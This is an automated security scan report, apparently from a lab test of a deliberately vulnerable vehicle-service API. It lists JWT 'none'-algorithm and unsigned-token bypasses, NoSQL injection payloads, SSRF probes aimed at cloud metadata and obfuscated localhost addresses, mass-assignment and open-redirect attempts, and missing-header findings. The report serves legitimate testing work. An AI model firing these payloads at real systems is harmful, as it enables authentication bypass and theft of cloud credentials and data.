# ZAP-Python Security Report

**Target:** http://192.168.0.128:8888/
**Scanners:** Active IDOR Scanner, OS Command Injection, Missing Security Headers, Username Hash Disclosure (IDOR), SQL Injection, JWT Security Scanner, Mass Assignment Scanner, External Redirect Scanner, SSRF Scanner, XML External Entity (XXE)
**Total Findings:** 770

## Critical Severity Findings

### JWT Signature Exclusion
**Category:** API2:2023 Broken Authentication
**Exploitability:** High
**Description:** The server accepted a JWT with the signature removed.

**Affected Endpoints (1):**

#### 1. GET /identity/api/v2/vehicle/vehicles
```text
Token Used: eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ0ZXN0MUBnbWFpbC5jb20iLCJpYXQiOjE3NzA4NDUwMDYsImV4cCI6MTc3MTQ0OTgwNiwicm9sZSI6InVzZXIifQ.
Response Code: 200
```

---
### JWT None Algorithm
**Category:** API2:2023 Broken Authentication
**Exploitability:** High
**Description:** The server accepted a JWT signed with the 'none' algorithm.

**Affected Endpoints (7):**

#### 1. GET /community/api/v2/community/posts/recent
```text
Token Used: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ0ZXN0MUBnbWFpbC5jb20iLCJpYXQiOjE3NzA4NDUwMDYsImV4cCI6MTc3MTQ0OTgwNiwicm9sZSI6InVzZXIifQ.
Response Code: 200
```

#### 2. GET /identity/api/v2/vehicle/vehicles
```text
Token Used: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ0ZXN0MUBnbWFpbC5jb20iLCJpYXQiOjE3NzA4NDUwMDYsImV4cCI6MTc3MTQ0OTgwNiwicm9sZSI6InVzZXIifQ.
Response Code: 200
```

#### 3. GET /workshop/api/management/users/all
```text
Token Used: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ0ZXN0MUBnbWFpbC5jb20iLCJpYXQiOjE3NzA4NDUwMDYsImV4cCI6MTc3MTQ0OTgwNiwicm9sZSI6InVzZXIifQ.
Response Code: 200
```

#### 4. GET /workshop/api/mechanic/
```text
Token Used: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ0ZXN0MUBnbWFpbC5jb20iLCJpYXQiOjE3NzA4NDUwMDYsImV4cCI6MTc3MTQ0OTgwNiwicm9sZSI6InVzZXIifQ.
Response Code: 200
```

#### 5. GET /workshop/api/mechanic/service_requests
```text
Token Used: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ0ZXN0MUBnbWFpbC5jb20iLCJpYXQiOjE3NzA4NDUwMDYsImV4cCI6MTc3MTQ0OTgwNiwicm9sZSI6InVzZXIifQ.
Response Code: 200
```

#### 6. GET /workshop/api/shop/orders/all
```text
Token Used: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ0ZXN0MUBnbWFpbC5jb20iLCJpYXQiOjE3NzA4NDUwMDYsImV4cCI6MTc3MTQ0OTgwNiwicm9sZSI6InVzZXIifQ.
Response Code: 200
```

#### 7. GET /workshop/api/shop/products
```text
Token Used: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ0ZXN0MUBnbWFpbC5jb20iLCJpYXQiOjE3NzA4NDUwMDYsImV4cCI6MTc3MTQ0OTgwNiwicm9sZSI6InVzZXIifQ.
Response Code: 200
```

---
### NoSQL Injection (Logic Bypass)
**Category:** API8:2023 Injection
**Exploitability:** High
**Description:** The endpoint returned HTTP 200 OK for a NoSQL logic bypass payload. This suggests it accepted the query.

**Affected Endpoints (11):**

#### 1. POST /community/api/v2/coupon/new-coupon
```text
Param: body
Payload: {'email': '{"$ne": null}', 'password': 'test'}
Response Code: 200
```

#### 2. POST /community/api/v2/coupon/new-coupon
```text
Param: body
Payload: {'content': 'test', 'title': "'; return true; var foo='"}
Response Code: 200
```

#### 3. POST /community/api/v2/coupon/new-coupon
```text
Param: body
Payload: {'email': '{"$gt": ""}', 'password': 'test'}
Response Code: 200
```

#### 4. POST /community/api/v2/coupon/new-coupon
```text
Param: body
Payload: {'content': 'test', 'title': '{"$ne": null}'}
Response Code: 200
```

#### 5. POST /community/api/v2/coupon/new-coupon
```text
Param: body
Payload: {'content': 'test', 'title': '{"$gt": ""}'}
Response Code: 200
```

#### 6. POST /community/api/v2/coupon/new-coupon
```text
Param: body
Payload: {'coupon_code': 'test', 'amount': "'; return true; var foo='"}
Response Code: 200
```

#### 7. POST /community/api/v2/coupon/new-coupon
```text
Param: body
Payload: {'coupon_code': 'test', 'amount': '{"$ne": null}'}
Response Code: 200
```

#### 8. POST /community/api/v2/coupon/new-coupon
```text
Param: body
Payload: {'coupon_code': 'test', 'amount': '{"$gt": ""}'}
Response Code: 200
```

#### 9. POST /workshop/api/shop/products
```text
Param: body
Payload: {'email': 'test', 'password': "'; return true; var foo='"}
Response Code: 200
```

#### 10. POST /workshop/api/shop/products
```text
Param: body
Payload: {'email': 'test', 'password': '{"$ne": null}'}
Response Code: 200
```

#### 11. POST /workshop/api/shop/products
```text
Param: body
Payload: {'email': 'test', 'password': '{"$gt": ""}'}
Response Code: 200
```

---
### SSRF - Cloud Metadata Exposure
**Category:** API10:2023 Server Side Request Forgery (SSRF)
**Exploitability:** High
**Description:** The application appears to have fetched an internal/external resource requested via the 'email' parameter (Content Match).

**Affected Endpoints (13):**

#### 1. POST /community/api/v2/community/posts
```text
Payload: http://100.100.100.200/latest/meta-data/
Matched Regex: latest/meta-data
Response Snippet: User was not found for parameters {userEmail=http://100.100.100.200/latest/meta-data/}
```

#### 2. POST /community/api/v2/community/posts
```text
Payload: http://169.254.169.254/computeMetadata/v1/
Matched Regex: computeMetadata
Response Snippet: User was not found for parameters {userEmail=http://169.254.169.254/computeMetadata/v1/}
```

#### 3. POST /community/api/v2/community/posts
```text
Payload: http://169.254.169.254/latest/meta-data/
Matched Regex: latest/meta-data
Response Snippet: {"message":"Validation failed","details":"org.springframework.validation.BeanPropertyBindingResult: 
```

#### 4. POST /community/api/v2/community/posts
```text
Payload: http://instance-data/latest/meta-data/
Matched Regex: latest/meta-data
Response Snippet: User was not found for parameters {userEmail=http://instance-data/latest/meta-data/}
```

#### 5. POST /identity/api/auth/login
```text
Payload: http://169.254.169.254/computeMetadata/v1/
Matched Regex: computeMetadata
Response Snippet: {"message":"Validation failed","details":"org.springframework.validation.BeanPropertyBindingResult: 
```

#### 6. POST /identity/api/auth/login
```text
Payload: http://instance-data/latest/meta-data/
Matched Regex: latest/meta-data
Response Snippet: User was not found for parameters {userEmail=http://instance-data/latest/meta-data/}
```

#### 7. POST /identity/api/auth/login
```text
Payload: http://100.100.100.200/latest/meta-data/
Matched Regex: latest/meta-data
Response Snippet: {"message":"Validation failed","details":"org.springframework.validation.BeanPropertyBindingResult: 
```

#### 8. POST /identity/api/v2/user/change-email
```text
Payload: http://instance-data/latest/meta-data/
Matched Regex: latest/meta-data
Response Snippet: {"message":"Validation failed","details":"org.springframework.validation.BeanPropertyBindingResult: 
```

#### 9. POST /identity/api/v2/user/reset-password
```text
Payload: http://169.254.169.254/computeMetadata/v1/
Matched Regex: latest/meta-data
Response Snippet: {"posts":[{"id":"L3BvMrtK6ngny5mGFWMKhR","title":"http://127.0.0.1.nip.io:8888","content":"test","au
```

#### 10. POST /identity/api/v2/user/reset-password
```text
Payload: http://100.100.100.200/latest/meta-data/
Matched Regex: latest/meta-data
Response Snippet: {"posts":[{"id":"L3BvMrtK6ngny5mGFWMKhR","title":"http://127.0.0.1.nip.io:8888","content":"test","au
```

#### 11. POST /identity/api/v2/user/reset-password
```text
Payload: http://instance-data/latest/meta-data/
Matched Regex: latest/meta-data
Response Snippet: {"posts":[{"id":"L3BvMrtK6ngny5mGFWMKhR","title":"http://127.0.0.1.nip.io:8888","content":"test","au
```

#### 12. POST /identity/api/v2/vehicle/add_vehicle
```text
Payload: http://169.254.169.254/latest/meta-data/
Matched Regex: latest/meta-data
Response Snippet: User was not found for parameters {userEmail=http://169.254.169.254/latest/meta-data/}
```

#### 13. POST /identity/api/v2/vehicle/add_vehicle
```text
Payload: http://169.254.169.254/computeMetadata/v1/
Matched Regex: computeMetadata
Response Snippet: User was not found for parameters {userEmail=http://169.254.169.254/computeMetadata/v1/}
```

---
### SSRF - Internal Network Access
**Category:** API10:2023 Server Side Request Forgery (SSRF)
**Exploitability:** High
**Description:** The application returned a response indicating successful access to localhost:8888.

**Affected Endpoints (21):**

#### 1. POST /community/api/v2/community/posts
```text
Payload: http://127.0.0.1.nip.io:8888
Status: 200
Content Matched: response_from_mechanic_api or 200 OK
```

#### 2. POST /identity/api/v2/user/reset-password
```text
Payload: http://localhost:22
Matched Regex: latest/meta-data
Response Snippet: {"posts":[{"id":"L3BvMrtK6ngny5mGFWMKhR","title":"http://127.0.0.1.nip.io:8888","content":"test","au
```

#### 3. POST /identity/api/v2/user/reset-password
```text
Payload: http://127.0.0.1:22
Matched Regex: latest/meta-data
Response Snippet: {"posts":[{"id":"L3BvMrtK6ngny5mGFWMKhR","title":"http://127.0.0.1.nip.io:8888","content":"test","au
```

#### 4. POST /identity/api/v2/user/reset-password
```text
Payload: http://localhost:8888
Matched Regex: latest/meta-data
Response Snippet: {"posts":[{"id":"L3BvMrtK6ngny5mGFWMKhR","title":"http://127.0.0.1.nip.io:8888","content":"test","au
```

#### 5. POST /identity/api/v2/user/reset-password
```text
Payload: http://localhost:9999
Matched Regex: latest/meta-data
Response Snippet: {"posts":[{"id":"L3BvMrtK6ngny5mGFWMKhR","title":"http://127.0.0.1.nip.io:8888","content":"test","au
```

#### 6. POST /identity/api/v2/user/reset-password
```text
Payload: http://2130706433
Matched Regex: latest/meta-data
Response Snippet: {"posts":[{"id":"L3BvMrtK6ngny5mGFWMKhR","title":"http://127.0.0.1.nip.io:8888","content":"test","au
```

#### 7. POST /identity/api/v2/user/reset-password
```text
Payload: http://0x7f000001
Matched Regex: latest/meta-data
Response Snippet: {"posts":[{"id":"L3BvMrtK6ngny5mGFWMKhR","title":"http://127.0.0.1.nip.io:8888","content":"test","au
```

#### 8. POST /identity/api/v2/user/reset-password
```text
Payload: http://0x7f.0.0.1
Matched Regex: latest/meta-data
Response Snippet: {"posts":[{"id":"L3BvMrtK6ngny5mGFWMKhR","title":"http://127.0.0.1.nip.io:8888","content":"test","au
```

#### 9. POST /identity/api/v2/user/reset-password
```text
Payload: http://0177.0.0.1
Matched Regex: latest/meta-data
Response Snippet: {"posts":[{"id":"L3BvMrtK6ngny5mGFWMKhR","title":"http://127.0.0.1.nip.io:8888","content":"test","au
```

#### 10. POST /identity/api/v2/user/reset-password
```text
Payload: http://127.1
Matched Regex: latest/meta-data
Response Snippet: {"posts":[{"id":"L3BvMrtK6ngny5mGFWMKhR","title":"http://127.0.0.1.nip.io:8888","content":"test","au
```

#### 11. POST /identity/api/v2/user/reset-password
```text
Payload: http://0.0.0.0:8888
Matched Regex: latest/meta-data
Response Snippet: {"posts":[{"id":"L3BvMrtK6ngny5mGFWMKhR","title":"http://127.0.0.1.nip.io:8888","content":"test","au
```

#### 12. POST /identity/api/v2/user/reset-password
```text
Payload: http://[::]:8888
Matched Regex: latest/meta-data
Response Snippet: {"posts":[{"id":"L3BvMrtK6ngny5mGFWMKhR","title":"http://127.0.0.1.nip.io:8888","content":"test","au
```

#### 13. POST /identity/api/v2/user/reset-password
```text
Payload: http://localtest.me:8888
Matched Regex: latest/meta-data
Response Snippet: {"posts":[{"id":"L3BvMrtK6ngny5mGFWMKhR","title":"http://127.0.0.1.nip.io:8888","content":"test","au
```

#### 14. POST /identity/api/v2/user/reset-password
```text
Payload: http://127.0.0.1.nip.io:8888
Matched Regex: latest/meta-data
Response Snippet: {"posts":[{"id":"L3BvMrtK6ngny5mGFWMKhR","title":"http://127.0.0.1.nip.io:8888","content":"test","au
```

#### 15. POST /identity/api/v2/user/reset-password
```text
Payload: http://localhost:8888
Status: 200
Content Matched: response_from_mechanic_api or 200 OK
```

#### 16. POST /identity/api/v2/user/reset-password
```text
Payload: http://127.0.0.1.nip.io:8888
Status: 200
Content Matched: response_from_mechanic_api or 200 OK
```

#### 17. GET /workshop/api/mechanic/service_requests
```text
Payload: http://localhost:8888
Status: 200
Content Matched: response_from_mechanic_api or 200 OK
```

#### 18. GET /workshop/api/mechanic/service_requests
```text
Payload: http://127.0.0.1.nip.io:8888
Status: 200
Content Matched: response_from_mechanic_api or 200 OK
```

#### 19. POST /workshop/api/merchant/contact_mechanic
```text
Payload: http://localhost:8888
Status: 200
Content Matched: response_from_mechanic_api or 200 OK
```

#### 20. POST /workshop/api/merchant/contact_mechanic
```text
Payload: http://127.0.0.1.nip.io:8888
Status: 200
Content Matched: response_from_mechanic_api or 200 OK
```

#### 21. POST /workshop/api/merchant/contact_mechanic
```text
Payload: http://127.0.0.1.nip.io:8888
Status: 500
Content Matched: response_from_mechanic_api or 200 OK
```

---
## High Severity Findings

### Potential IDOR (ID Fuzzing)
**Category:** API1:2023 Broken Object Level Authorization
**Exploitability:** High
**Description:** The endpoint returned a 2xx success code when accessing ID '1' via ID Fuzzing. Verify authorization.
Discovered sensitive key: \"email\":

**Affected Endpoints (1):**

#### 1. PUT /workshop/api/shop/orders/{order_id}
```text
Method: GET
URL: http://192.168.0.128:8888/workshop/api/shop/orders/1
Payload: 1
Status: 200
```

---
### Potential IDOR (Method Swap (GET))
**Category:** API1:2023 Broken Object Level Authorization
**Exploitability:** High
**Description:** The endpoint returned a 2xx success code when accessing ID '1' via Method Swap (GET). Verify authorization.
Discovered sensitive key: \"email\":

**Affected Endpoints (1):**

#### 1. PUT /workshop/api/shop/orders/{order_id}
```text
Method: GET
URL: http://192.168.0.128:8888/workshop/api/shop/orders/1
Payload: 1
Status: 200
```

---
### SSRF - Connection Attempt Failed
**Category:** API10:2023 Server Side Request Forgery (SSRF)
**Exploitability:** High
**Description:** The application revealed a connection error when trying to access an internal port, indicating it attempted the connection.

**Affected Endpoints (1):**

#### 1. POST /workshop/api/merchant/contact_mechanic
```text
Payload: http://127.0.0.1.nip.io:8888
Response content indicates connection failure (Blind SSRF): '{"message":"Could not connect to mechanic api."}'
```

---
## Medium Severity Findings

### Mass Assignment (Status Anomaly)
**Category:** API3:2023 Broken Object Property Level Authorization
**Exploitability:** Medium
**Description:** Injecting 'confirmed' caused a status code change from 400 to 200. Investigate for logic bypass.

**Affected Endpoints (15):**

#### 1. POST /community/api/v2/coupon/new-coupon
```text
Param: confirmed
Baseline Status: 400
Attack Status: 200
```

#### 2. POST /identity/api/auth/v2.7/user/login-with-token
```text
Param: credit
Baseline Status: 400
Attack Status: 200
```

#### 3. POST /identity/api/auth/v2.7/user/login-with-token
```text
Param: isAdmin
Baseline Status: 400
Attack Status: 200
```

#### 4. POST /identity/api/auth/v2.7/user/login-with-token
```text
Param: is_admin
Baseline Status: 400
Attack Status: 200
```

#### 5. POST /identity/api/auth/v2.7/user/login-with-token
```text
Param: status
Baseline Status: 400
Attack Status: 200
```

#### 6. POST /identity/api/auth/v2.7/user/login-with-token
```text
Param: admin
Baseline Status: 400
Attack Status: 200
```

#### 7. POST /identity/api/auth/v2.7/user/login-with-token
```text
Param: isVerified
Baseline Status: 400
Attack Status: 200
```

#### 8. POST /identity/api/auth/v2.7/user/login-with-token
```text
Param: confirmed
Baseline Status: 400
Attack Status: 200
```

#### 9. POST /identity/api/auth/v2.7/user/login-with-token
```text
Param: role
Baseline Status: 400
Attack Status: 200
```

#### 10. POST /identity/api/auth/v2.7/user/login-with-token
```text
Param: roles
Baseline Status: 400
Attack Status: 200
```

#### 11. POST /identity/api/auth/v2.7/user/login-with-token
```text
Param: type
Baseline Status: 400
Attack Status: 200
```

#### 12. POST /identity/api/auth/v2.7/user/login-with-token
```text
Param: balance
Baseline Status: 400
Attack Status: 200
```

#### 13. POST /identity/api/v2/vehicle/add_vehicle
```text
Param: admin
Baseline Status: 400
Attack Status: 200
```

#### 14. POST /identity/api/v2/vehicle/add_vehicle
```text
Param: role
Baseline Status: 400
Attack Status: 200
```

#### 15. POST /identity/api/v2/vehicle/add_vehicle
```text
Param: roles
Baseline Status: 400
Attack Status: 200
```

---
### Open Redirect (Header)
**Category:** API7:2023 Security Misconfiguration
**Exploitability:** Medium
**Description:** The application redirects to an arbitrary external domain specified in the request parameter.

**Affected Endpoints (21):**

#### 1. GET /community/api/v2/community/posts/{postId}
```text
Param: postId
Payload: //be93df26-82bb-4002-aea4-f4483f05811b.owasp.org
Location Header: /community/api/v2/community/posts/be93df26-82bb-4002-aea4-f4483f05811b.owasp.org
```

#### 2. GET /community/api/v2/community/posts/{postId}
```text
Param: postId
Payload: HtTpS://be93df26-82bb-4002-aea4-f4483f05811b.owasp.org
Location Header: /community/api/v2/community/posts/HtTpS:/be93df26-82bb-4002-aea4-f4483f05811b.owasp.org
```

#### 3. GET /community/api/v2/community/posts/{postId}
```text
Param: postId
Payload: HtTp://be93df26-82bb-4002-aea4-f4483f05811b.owasp.org
Location Header: /community/api/v2/community/posts/HtTp:/be93df26-82bb-4002-aea4-f4483f05811b.owasp.org
```

#### 4. GET /community/api/v2/community/posts/{postId}
```text
Param: postId
Payload: https://be93df26-82bb-4002-aea4-f4483f05811b.owasp.org/?foo
Location Header: /community/api/v2/community/posts/https:/be93df26-82bb-4002-aea4-f4483f05811b.owasp.org/?foo
```

#### 5. GET /community/api/v2/community/posts/{postId}
```text
Param: postId
Payload: https://be93df26-82bb-4002-aea4-f4483f05811b.owasp.org
Location Header: /community/api/v2/community/posts/https:/be93df26-82bb-4002-aea4-f4483f05811b.owasp.org
```

#### 6. GET /community/api/v2/community/posts/{postId}
```text
Param: postId
Payload: https://\be93df26-82bb-4002-aea4-f4483f05811b.owasp.org
Location Header: /community/api/v2/community/posts/https:/%5Cbe93df26-82bb-4002-aea4-f4483f05811b.owasp.org
```

#### 7. GET /community/api/v2/community/posts/{postId}
```text
Param: postId
Payload: http://\be93df26-82bb-4002-aea4-f4483f05811b.owasp.org
Location Header: /community/api/v2/community/posts/http:/%5Cbe93df26-82bb-4002-aea4-f4483f05811b.owasp.org
```

#### 8. GET /community/api/v2/community/posts/{postId}
```text
Param: postId
Payload: 5;URL='https://be93df26-82bb-4002-aea4-f4483f05811b.owasp.org'
Location Header: /community/api/v2/community/posts/5;URL=%27https:/be93df26-82bb-4002-aea4-f4483f05811b.owasp.org%27
```

#### 9. GET /community/api/v2/community/posts/{postId}
```text
Param: postId
Payload: URL='http://be93df26-82bb-4002-aea4-f4483f05811b.owasp.org'
Location Header: /community/api/v2/community/posts/URL=%27http:/be93df26-82bb-4002-aea4-f4483f05811b.owasp.org%27
```

#### 10. GET /community/api/v2/community/posts/{postId}
```text
Param: postId
Payload: 5;URL='https://be93df26-82bb-4002-aea4-f4483f05811b.owasp.org/?foo'
Location Header: /community/api/v2/community/posts/5;URL=%27https:/be93df26-82bb-4002-aea4-f4483f05811b.owasp.org/?foo'
```

#### 11. POST /community/api/v2/community/posts/{postId}/comment
```text
Param: postId
Payload: http://75c729f1-6b77-4e0a-8ee1-36a455825c12.owasp.org
Location Header: /community/api/v2/community/posts/http:/75c729f1-6b77-4e0a-8ee1-36a455825c12.owasp.org/comment
```

#### 12. POST /community/api/v2/community/posts/{postId}/comment
```text
Param: postId
Payload: https://75c729f1-6b77-4e0a-8ee1-36a455825c12.owasp.org
Location Header: /community/api/v2/community/posts/https:/75c729f1-6b77-4e0a-8ee1-36a455825c12.owasp.org/comment
```

#### 13. POST /community/api/v2/community/posts/{postId}/comment
```text
Param: postId
Payload: //75c729f1-6b77-4e0a-8ee1-36a455825c12.owasp.org
Location Header: /community/api/v2/community/posts/75c729f1-6b77-4e0a-8ee1-36a455825c12.owasp.org/comment
```

#### 14. POST /community/api/v2/community/posts/{postId}/comment
```text
Param: postId
Payload: HtTpS://75c729f1-6b77-4e0a-8ee1-36a455825c12.owasp.org
Location Header: /community/api/v2/community/posts/HtTpS:/75c729f1-6b77-4e0a-8ee1-36a455825c12.owasp.org/comment
```

#### 15. POST /community/api/v2/community/posts/{postId}/comment
```text
Param: postId
Payload: HtTp://75c729f1-6b77-4e0a-8ee1-36a455825c12.owasp.org
Location Header: /community/api/v2/community/posts/HtTp:/75c729f1-6b77-4e0a-8ee1-36a455825c12.owasp.org/comment
```

#### 16. POST /community/api/v2/community/posts/{postId}/comment
```text
Param: postId
Payload: https://75c729f1-6b77-4e0a-8ee1-36a455825c12.owasp.org/?foo
Location Header: /community/api/v2/community/posts/https:/75c729f1-6b77-4e0a-8ee1-36a455825c12.owasp.org/?foo/comment
```

#### 17. POST /community/api/v2/community/posts/{postId}/comment
```text
Param: postId
Payload: https://\75c729f1-6b77-4e0a-8ee1-36a455825c12.owasp.org
Location Header: /community/api/v2/community/posts/https:/%5C75c729f1-6b77-4e0a-8ee1-36a455825c12.owasp.org/comment
```

#### 18. POST /community/api/v2/community/posts/{postId}/comment
```text
Param: postId
Payload: http://\75c729f1-6b77-4e0a-8ee1-36a455825c12.owasp.org
Location Header: /community/api/v2/community/posts/http:/%5C75c729f1-6b77-4e0a-8ee1-36a455825c12.owasp.org/comment
```

#### 19. POST /community/api/v2/community/posts/{postId}/comment
```text
Param: postId
Payload: 5;URL='https://75c729f1-6b77-4e0a-8ee1-36a455825c12.owasp.org'
Location Header: /community/api/v2/community/posts/5;URL=%27https:/75c729f1-6b77-4e0a-8ee1-36a455825c12.owasp.org%27/comment
```

#### 20. POST /community/api/v2/community/posts/{postId}/comment
```text
Param: postId
Payload: URL='http://75c729f1-6b77-4e0a-8ee1-36a455825c12.owasp.org'
Location Header: /community/api/v2/community/posts/URL=%27http:/75c729f1-6b77-4e0a-8ee1-36a455825c12.owasp.org%27/comment
```

#### 21. POST /community/api/v2/community/posts/{postId}/comment
```text
Param: postId
Payload: 5;URL='https://75c729f1-6b77-4e0a-8ee1-36a455825c12.owasp.org/?foo'
Location Header: /community/api/v2/community/posts/5;URL=%27https:/75c729f1-6b77-4e0a-8ee1-36a455825c12.owasp.org/?foo'/comment
```

---
## Low Severity Findings

### Missing Content-Security-Policy Header
**Category:** API7:2023 Security Misconfiguration
**Exploitability:** Low
**Description:** The response is missing the Content-Security-Policy security header.

**Affected Endpoints (21):**

#### 1. GET /community/api/v2/community/posts/recent
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Access-Control-Allow-Headers', 'Access-Control-Allow-Methods', 'Access-Control-Allow-Origin']
```

#### 2. GET /community/api/v2/community/posts/{postId}
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Access-Control-Allow-Headers', 'Access-Control-Allow-Methods', 'Access-Control-Allow-Origin']
```

#### 3. POST /community/api/v2/community/posts/{postId}/comment
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Access-Control-Allow-Headers', 'Access-Control-Allow-Methods', 'Access-Control-Allow-Origin']
```

#### 4. DELETE /identity/api/v2/admin/videos/{video_id}
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Content-Type-Options', 'X-XSS-Protection', 'Cache-Control', 'Pragma', 'Expires', 'X-Frame-Options']
```

#### 5. POST /identity/api/v2/user/change-email
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Content-Type-Options', 'X-XSS-Protection', 'Cache-Control', 'Pragma', 'Expires', 'X-Frame-Options']
```

#### 6. POST /identity/api/v2/user/change-email
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Content-Length', 'Connection', 'Vary', 'X-Content-Type-Options', 'X-XSS-Protection', 'Cache-Control', 'Pragma', 'Expires', 'X-Frame-Options']
```

#### 7. DELETE /identity/api/v2/user/videos/{video_id}
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Content-Type-Options', 'X-XSS-Protection', 'Cache-Control', 'Pragma', 'Expires', 'X-Frame-Options']
```

#### 8. GET /identity/api/v2/user/videos/{video_id}
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Content-Type-Options', 'X-XSS-Protection', 'Cache-Control', 'Pragma', 'Expires', 'X-Frame-Options']
```

#### 9. PUT /identity/api/v2/user/videos/{video_id}
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Content-Type-Options', 'X-XSS-Protection', 'Cache-Control', 'Pragma', 'Expires', 'X-Frame-Options']
```

#### 10. POST /identity/api/v2/vehicle/resend_email
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Content-Length', 'Connection', 'Content-Disposition', 'Allow', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

#### 11. POST /identity/api/v2/vehicle/resend_email
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Content-Length', 'Connection', 'Vary', 'X-Content-Type-Options', 'X-XSS-Protection', 'Cache-Control', 'Pragma', 'Expires', 'X-Frame-Options']
```

#### 12. POST /identity/api/v2/vehicle/resend_email
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Content-Type-Options', 'X-XSS-Protection', 'Cache-Control', 'Pragma', 'Expires', 'X-Frame-Options']
```

#### 13. POST /identity/api/v2/vehicle/resend_email
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Access-Control-Allow-Headers', 'Access-Control-Allow-Methods', 'Access-Control-Allow-Origin']
```

#### 14. POST /identity/api/v2/vehicle/resend_email
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Allow', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

#### 15. GET /identity/api/v2/vehicle/{vehicleId}/location
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Content-Type-Options', 'X-XSS-Protection', 'Cache-Control', 'Pragma', 'Expires', 'X-Frame-Options']
```

#### 16. GET /workshop/api/management/users/all
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Allow', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

#### 17. GET /workshop/api/mechanic/receive_report
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Allow', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

#### 18. GET /workshop/api/mechanic/service_requests
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Allow', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

#### 19. GET /workshop/api/shop/orders/all
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Allow', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

#### 20. POST /workshop/api/shop/orders/return_order
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

#### 21. PUT /workshop/api/shop/orders/{order_id}
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

---
### Missing Strict-Transport-Security Header
**Category:** API7:2023 Security Misconfiguration
**Exploitability:** Low
**Description:** The response is missing the Strict-Transport-Security security header.

**Affected Endpoints (21):**

#### 1. GET /community/api/v2/community/posts/recent
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Access-Control-Allow-Headers', 'Access-Control-Allow-Methods', 'Access-Control-Allow-Origin']
```

#### 2. GET /community/api/v2/community/posts/{postId}
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Access-Control-Allow-Headers', 'Access-Control-Allow-Methods', 'Access-Control-Allow-Origin']
```

#### 3. POST /community/api/v2/community/posts/{postId}/comment
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Access-Control-Allow-Headers', 'Access-Control-Allow-Methods', 'Access-Control-Allow-Origin']
```

#### 4. DELETE /identity/api/v2/admin/videos/{video_id}
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Content-Type-Options', 'X-XSS-Protection', 'Cache-Control', 'Pragma', 'Expires', 'X-Frame-Options']
```

#### 5. POST /identity/api/v2/user/change-email
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Content-Type-Options', 'X-XSS-Protection', 'Cache-Control', 'Pragma', 'Expires', 'X-Frame-Options']
```

#### 6. POST /identity/api/v2/user/change-email
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Content-Length', 'Connection', 'Vary', 'X-Content-Type-Options', 'X-XSS-Protection', 'Cache-Control', 'Pragma', 'Expires', 'X-Frame-Options']
```

#### 7. DELETE /identity/api/v2/user/videos/{video_id}
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Content-Type-Options', 'X-XSS-Protection', 'Cache-Control', 'Pragma', 'Expires', 'X-Frame-Options']
```

